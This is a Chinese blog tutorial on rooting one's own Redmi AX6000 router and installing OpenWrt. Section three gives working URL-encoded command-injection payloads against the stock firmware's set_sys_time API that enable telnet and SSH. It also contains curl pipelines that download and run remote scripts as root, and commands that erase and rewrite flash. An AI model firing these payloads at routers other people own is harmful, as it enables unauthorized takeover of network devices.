---
title: 网络设备底层探索：Redmi AX6000 的 SSH 解锁与第三方 OS 适配
published: 2026-03-05
description: 本文以 Redmi AX6000 为实验平台，完整梳理从原厂固件漏洞利用、SSH 权限获取，到最终完成高度定制化 OpenWrt 操作系统适配的软硬件结合流程。涵盖底层引导修改、存储分区规划及高阶组网构想。
tags: [openwrt, SSH, ARM, Linux, 嵌入式开发, 异地组网]
category: 嵌入式 Linux
draft: false
---

&emsp;&emsp;作为一名致力于打通底层硬件与顶层算法全链路的开发者，我对物理设备底层协议的控制欲大概是天生的——这种执念不仅体现在画 PCB 和调试单片机上，也同样体现在每天都要用到的网络网关上。由于运营商未曾分配 IPv4 公网地址，而我急切需要公网 IPv6 来实现更多有趣的网络应用，刷入可定制的 OpenWrt 系统成为了唯一的出路。经过调研，Redmi AX6000 在开源社区的口碑相对较好，拥有较强的硬件支持和活跃的开发者生态，于是这款设备便成为了我的实验对象

&emsp;&emsp;Redmi AX6000 搭载了联发科 MT7986A（Filogic 830）四核 ARM Cortex-A53 处理器，主频高达 2.0GHz，搭配 512MB 的大内存。更重要的是，这颗 SoC 拥有极其优异的硬件加速（Hardware Offloading）特性和出色的功耗控制。然而，封闭的原厂固件宛如一个黑盒，完全限制了这台设备的真正潜力。为了将其打造为我个人工作流中的核心网络枢纽，获取底层的完全控制权并刷入高度可定制的 OpenWrt 系统，成为了势在必行的折腾之旅。

&emsp;&emsp;本文将完整复盘 Redmi AX6000 **从漏洞利用、破解 SSH 权限，到刷写底层引导加载程序（U-Boot）**，并最终部署定制版 OpenWrt 系统的全过程。
![AX6000img](/assets/blogimg/AX6000_OPWRT/AXimg.png)

*(注：刷机涉及底层存储修改，有一定变砖风险。建议在操作前熟悉基本的 Linux 命令行语法、MTD 分区概念与网络协议。)*

---
## 一、 开始
### 准备
* 红米 AX6000 无线路由器
* 两根网线
* 牙签（或取卡针）
* WinSCP
* Telnet/SSH 客户端
* 小米路由固件 1.2.8 版本
* CatWrt for Redmi AX6000
### 恢复
* 小米路由官方修复工具
* 小米路由固件 1.0.48 版本
---

## 二、 固件降级与底层鉴权 Token 提取

由于厂家的安全策略更新，最新的固件已经无法直接利用常规的 Web 接口漏洞进行提权。我们的第一步是让系统“时光倒流”，回到那个防线尚未完全建立的版本。

### 1. 手动降级流程
使用网线将 PC 连接到路由器的 LAN 口，登录默认的 Web 管理后台（通常为 `192.168.31.1`）。跳过向导后，进入“系统设置” -> “升级”，选择手动升级，并将准备好的旧版固件包（如 `1.2.8`）上传固化。
降级过程大约需要 3-5 分钟，期间路由器会经历闪灯和重启。**此时绝对不能断电。**
![AX6000update](/assets/blogimg/AX6000_OPWRT/update.png)

### 2. 嗅探 STOK (Session Token)
系统重启完毕后，重新进入 Web 后台并完成基础的初始化向导。
重点来了：登录成功后，不要关闭浏览器。观察浏览器的地址栏，URL 会呈现类似如下的结构：
`http://192.168.31.1/cgi-bin/luci/;stok=a1b2c3d4e5f6g7h8/web/home`

其中，`stok=` 后面那一串随机的哈希字符，就是当前会话的授权 Token。它是我们后续与路由器底层 CGI 接口进行非预期交互的“通行证”。请将其精准复制并保存到记事本中备用。




## 三、 漏洞提权：从命令注入到 SSH 固化

获取到 STOK 后，我们将利用原厂固件中某些特定 API（如网络诊断模块或日志收集模块）对传入参数过滤不严的缺陷，执行 Shell 命令注入，从而在后台静默开启 Telnet 服务。

### 1. 构造 Payload 开启 Telnet
在浏览器的新标签页中，依次拼接并访问以下特定构造的 URL（请务必将其中的 `<STOK>` 替换为你刚才获取的真实值）。
```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20zz%3D%24%28dd%20if%3D%2Fdev%2Fzero%20bs%3D1%20count%3D2%202%3E%2Fdev%2Fnull%29%20%3B%20printf%20%27%A5%5A%25c%25c%27%20%24zz%20%24zz%20%7C%20mtd%20write%20-%20crash%20%3B%20
```
![AX6000img](/assets/blogimg/AX6000_OPWRT/unlockssh.png)

若 API 输出 `{"code":0}` 就说明步骤执行无误，可以继续进行。将重启链接中的 `stok` 也替换为最新的值

```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20
```

![AX6000img](/assets/blogimg/AX6000_OPWRT/sshall.jpg)

设备重启后再次进入小米路由器后台，再次复制新的 `stok` 值。注意重启后的 `stok` 会发生变化，请不要混淆使用

```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20bdata%20set%20telnet_en%3D1%20%3B%20bdata%20set%20ssh_en%3D1%20%3B%20bdata%20set%20uart_en%3D1%20%3B%20bdata%20commit%20%3B%20
```

成功执行 API 后同样会输出 `{"code":0}`。接着输入以下链接（替换 `stok` 值），回车后路由器将进入重启

```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20
```

### 2. 利用 Telnet 会话解锁 SSH
设备重启完毕后，Telnet 服务已开启。打开本地终端（Windows 的 `cmd` 或 `Windows Terminal`），执行以下命令连接到路由器：

```bash
telnet 192.168.31.1
```

成功进入 Telnet 会话后，我们需要执行解锁脚本来固化 SSH 权限，以便后续刷入 U-Boot
感谢 @Timochan 编写的解锁脚本。在 Telnet 会话中执行以下命令（可直接复制粘贴）：

```bash
cd /tmp && curl --silent -O https://raw.miaoer.net/unlock-redmi-ax6000/cn/server/setup.sh && chmod +x setup.sh && ./setup.sh
```

脚本执行完成后，终端会显示「遗失对主机的连接」或连接断开提示。这是正常现象，表示设备重启并完成了 SSH 的固化

设备重启后，在终端中执行以下命令通过 SSH 连接：

```bash
ssh root@192.168.31.1
```

根据提示输入账号密码：
- 账号：`root`
- 密码：`admin`

首次连接时需要确认主机密钥，输入 `yes` 并按回车保存。确认后即可进入 SSH 会话
![finalshell](/assets/blogimg/AX6000_OPWRT/finalshell1.png)

## 四、备份和刷入 U-Boot
接下来使用 @hanwckf 编译的 U-Boot 和加载脚本。在 SSH 会话中执行以下命令来下载并备份原有的引导分区，然后执行刷入操作：

```bash
cd /tmp && curl --silent -O https://raw.miaoer.net/unlock-redmi-ax6000/cn/server/uboot.sh && chmod +x uboot.sh && ./uboot.sh
```
完成后会有一段代码飘过其中前面的是下载并且校验 U-boot 文件的哈希值，备份引导分区和提示部分
![finalshell](/assets/blogimg/AX6000_OPWRT/Ubootall.png)

脚本执行成功后，会提示 `Backup success! Please download it to your computer`，说明备份已完成。

现在打开 WinSCP 软件，使用 SCP 协议连接路由器。配置如下：
- **协议**：SCP
- **主机地址**：`192.168.31.1`
- **用户名**：`root`
- **密码**：`admin`

点击「链接」，在证书确认对话框中选择「是」来保存并信任证书

导航到 `/tmp` 目录，可以看到两个备份文件：
- `mtd4_Factory.bin`
- `mtd5_FIP.bin`

将这两个文件选中，拖动到本地计算机进行备份。**这一步至关重要**——如果后续发生严重问题需要恢复原厂固件，这两个文件是恢复的必备资源

值得一提的是，U-Boot 脚本的下载过程中若有错误，系统会明确提示。常见的错误提示包括：

- `Error: mt7986_redmi_ax6000-fip-fixed-parts.bin download failed` （下载失败）
- `Error: mt7986_redmi_ax6000-fip-fixed-parts.bin md5 is not correct` （校验和不匹配）

遇到这些错误时，通常是网络问题或文件损坏，重新执行脚本即可

接下来在 SSH 终端中依次执行以下命令来刷入 U-Boot 文件。**这一步必须按顺序执行，不能跳步或并行操作**：

```bash
mtd erase FIP
mtd write /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin FIP
mtd verify /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin FIP
```
输出参考，提示 Success 即可，并且内容需要一模一样。

```bash
root@XiaoQiang:~# mtd erase FIP
Unlocking FIP ...
Erasing FIP ...
root@XiaoQiang:~# mtd write /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin FIP
Unlocking FIP ...

Writing from /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin to FIP ...
root@XiaoQiang:~# mtd verify /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin FIP
Verifying FIP against /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin ...
72a110768c7473200b863a3c5d4dd975 - FIP
72a110768c7473200b863a3c5d4dd975 - /tmp/mt7986_redmi_ax6000-fip-fixed-parts.bin
Success
root@XiaoQiang:~#
```
**重要提示**：从此刻起，设备的网口分配已经改变。具体配置如下：
- **网口 1**：WAN 口（连接到运营商的光猫或线路）
- **网口 2/3/4**：LAN 口（连接到内网设备）

**设备不支持网口自适应识别**，请将连接电脑的网线插入到任意一个 LAN 口（网口 2、3 或 4）

现在需要配置电脑的网络地址以与 U-Boot 程序通信。根据你的 Windows 版本选择以下方式之一：

**方式一（控制面板）**：
1. 点击左下角 Windows 徽标，输入「控制面板」并回车
2. 依次进入：控制面板 → 查看网络状态和任务 → 更改适配器设置 → 以太网（右键）→ 属性
3. 双击「Internet 协议版本 4 (TCP/IPv4)」

**方式二（Windows 设置）**：
1. 进入 Windows 设置 → 网络和 Internet → 高级网络设置
2. 找到对应的以太网适配器 → IP 分配 → 编辑 → 选择 IPv4

在网卡配置中，选择「使用下面的 IP 地址」，按以下参数填入：

| 配置项 | 值 |
|------|--------|
| **IP 地址** | `192.168.31.2` |
| **子网掩码** | `255.255.255.0` |
| **默认网关** | `192.168.31.1` |
| **首选 DNS**（若需要） | `192.168.31.1` |

如果使用 Windows 设置方式，额外添加首选 DNS 为 `192.168.31.1` 

现在拔掉 AX6000 的电源，拿出牙签，同时按住 `Reset` 按钮并接入电源。**按住 Reset 键不放，心里默念 15 秒后松开**，设备将进入 U-Boot 恢复模式。

在浏览器中访问 `192.168.31.1`，进入 U-Boot 的 Web 管理界面。点击「选择文件」，找到你准备的 CatWrt 固件文件：

```
catwrt-v22.12-mediatek-filogic-xiaomi_redmi-router-ax6000-squashfs-sysupgrade.bin
```

选中后点击「Update」，固件将被上传到 U-Boot。上传完成后会自动进行兼容性检测

如果首次提示「Update Failed」，属于正常现象，无需惊慌。返回刷新页面，再次选择固件并上传。通常第二次会成功刷入。

当进度条完成，页面显示「Upgrade complete!」并且路由器的 LED 指示灯转为白色稳亮状态时，说明 U-Boot 刷入完毕，整个引导阶段宣告成功

## 五、OpenWrt 系统配置
CatWrt 固件的默认管理地址为 `192.168.1.4`。首先需要将电脑的网络设置改为 DHCP 自动获取（恢复之前的设置），然后在浏览器中输入以下地址登录后台：

```
http://192.168.1.4
```

登录凭证如下：
- **用户名**：`root`
- **密码**：`password`

成功登录后即可进入 LuCI 管理界面（CatWrt 的 Web 前端）
![catwrtdashboard](/assets/blogimg/AX6000_OPWRT/luci.png)

### LAN 口配置
点击菜单：网络 → 接口 → LAN → 编辑

根据你的需求调整以下参数：

| 配置项 | 推荐值 | 说明 |
|------|------|--------|
| **IPv4 地址** | `192.168.1.4` | 设备在 LAN 内的地址（可保持默认） |
| **子网掩码** | `255.255.255.0` | - |
| **IPv4 网关** | `192.168.1.4` | 本设备作为网关 |
| **IPv4 广播** | `192.168.1.255` | - |
| **DNS 服务器** | `119.29.29.99` / `223.5.5.5` | 阿里和腾讯公共 DNS（可选其他） |
| **IPv6 DNS** | `240C::6666` | IPv6 DNS 地址 |
| **DHCP 开始地址** | `192.168.1.20` 起 | 客户端 IP 池起始（默认 50，改为 20 可获得更多 IP） |

IPv6 默认已启用。根据需要修改后，点击「保存&应用」

点击「保存&应用」。若你修改了 LAN 地址，设备可能无法立即响应。此时可重启路由器，然后在浏览器地址栏中输入新的地址重新访问即可。

### WAN 口配置
点击菜单：网络 → 接口 → WAN → 编辑

![catwrtlan](/assets/blogimg/AX6000_OPWRT/lan.jpg)

**WAN 口配置根据你的网络环境而定**：

- **光猫拨号模式**：若光猫直接拨号，WAN 口配置无需修改（此模式下路由器作为二级网关）
- **光猫桥接模式**：若光猫工作在桥接状态，需要由路由器持有拨号权。此时：
  1. 点击「协议切换」
  2. 选择 `PPPoE` 协议
  3. 填入宽带账号和密码
  4. 点击「保存&应用」

点击「保存&应用」。

### 网络加速和上层协议支持
继续进行一些优化配置。点击菜单：网络 → Turbo ACC（网络加速）

这里只需启用「DNS 缓存」功能，可显著提升域名解析速度。保留已配置的 DNS 地址（如阿里、腾讯等）即可。

接下来启用 UPnP 支持，方便内网用户快速配置端口映射：
1. 点击菜单：服务 → UPnP/NAT-PMP
2. 勾选「启动 UPnP 与 NAT-PMP 服务」
3. 点击「保存&应用」

**关于端口转发**：OpenWrt 支持多种端口转发方式，包括 `Socat` 工具，可用于双栈（IPv4/IPv6）的端口转发需求，详情可参考 OpenWrt 文档

### 无线网络和其他功能

**无线部分**：Wi-Fi 部分配置较为直观，可自行设置 SSID、加密方式等。由于 CatWrt 采用开源的 MTK 无线驱动而非厂商闭源驱动，整体稳定性和兼容性已相当不错。需要注意的是，该系统暂不支持 Mesh 自组网功能（笔者尝试多次编译均告失败）。

**关于软件包**：CatWrt 预置了丰富的软件源，支持安装各类扩展应用。感兴趣的用户可通过「系统 → 软件包」继续深度定制。

完成以上所有配置后，建议重启一次设备以确保所有设置生效。执行菜单：系统 → 重启

重启完毕后，你的 Redmi AX6000 便已成功蜕变为功能齐全、可高度定制的 OpenWrt 网络中枢

---

## 六、总结与反思

&emsp;&emsp;从一个尝试简单刷机的想法，到完整梳理固件漏洞利用、SSH 权限破解、U-Boot 底层修改的全链路过程，这次 Redmi AX6000 的折腾之旅让我重新审视了"网络设备"这一看似简单却实则复杂的系统。

&emsp;&emsp;**技术收获方面**：我们从漏洞利用的角度深入理解了厂商固件的安全防线（以及其缺陷），体会到参数过滤不严如何导致命令注入漏洞；通过 STOK 的提取和利用，理解了会话管理和鉴权机制；通过 MTD 分区的直接操作，明白了嵌入式设备的引导流程与存储架构。这些知识对从事嵌入式安全研究的人来说，都是宝贵的实战经验。

&emsp;&emsp;**实际应用方面**：获得了公网 IPv6 地址这一初始目标已然达成，但更重要的是，Redmi AX6000 现已演变为我个人网络架构中的核心枢纽。通过 OpenWrt 的强大定制能力，我可以灵活部署各类网络应用——从 DNS 缓存加速、到 UPnP 端口映射、再到后续的异地组网和流量控制——这些在厂商原始固件中要么不存在、要么被深深藏在菜单深处，如今却尽在掌握。

&emsp;&emsp;**对开源社区的致敬**：这次成功的背后离不开诸如 @Timochan、@hanwckf 等开发者们的贡献。正是有了这些无私分享的解锁脚本、优化过的 U-Boot 和编译好的 OpenWrt 固件，普通用户才能突破厂商的封闭壁垒，享受真正自由的网络控制权。这也提醒我，在今后的项目中，更应当思考如何反馈社区、贡献代码，而非仅做一个知识的索取者。

&emsp;&emsp;如果你也对网络设备的深层原理感兴趣，或是正在为运营商的 IPv4 短缺而苦恼，不妨尝试这条折腾之路。过程中会遇到各种挑战，但当最终看到设备稳定运行、所有功能如期实现时，那种成就感是任何预装固件都无法提供的。